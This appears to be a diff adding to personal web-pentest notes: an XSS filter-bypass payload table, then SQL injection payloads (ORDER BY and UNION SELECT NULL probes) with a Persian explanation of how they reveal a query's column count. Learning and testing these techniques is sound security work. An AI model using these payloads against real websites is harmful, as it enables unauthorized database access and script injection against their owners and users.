@@ -24,3 +24,28 @@
 | Unicode bypass | `<scr<script>ipt>alert(1)</scr</script>ipt>`              |
 | Data URI       | `<iframe src="data:text/html,<script>alert(1)</script>">` |
 | JS protocol    | `<a href="javascript:alert(1)">Click</a>`                 |
+
+
+SQL INJECTION:
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+...
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+
+
+وقتی تعداد NULLها با تعداد ستون‌ها برابر باشد، پایگاه داده یک ردیف اضافی در مجموعه نتایج برمی‌گرداند که شامل مقادیر NULL در تمام ستون‌ها است.
+
+اثر این کار در پاسخ HTTP، بستگی به کد برنامه دارد:
+
+    اگر خوش‌شانس باشید، یک محتوای اضافی مثل یک ردیف اضافه در جدول HTML می‌بینید.
+
+    در غیر این صورت، NULL ممکن است یک خطای دیگر ایجاد کند، مثل NullPointerException.
+
+    در بدترین حالت، پاسخ ممکن است مثل حالتی باشد که تعداد ستون‌ها اشتباه است، و در نتیجه این روش بی‌اثر شود.
+
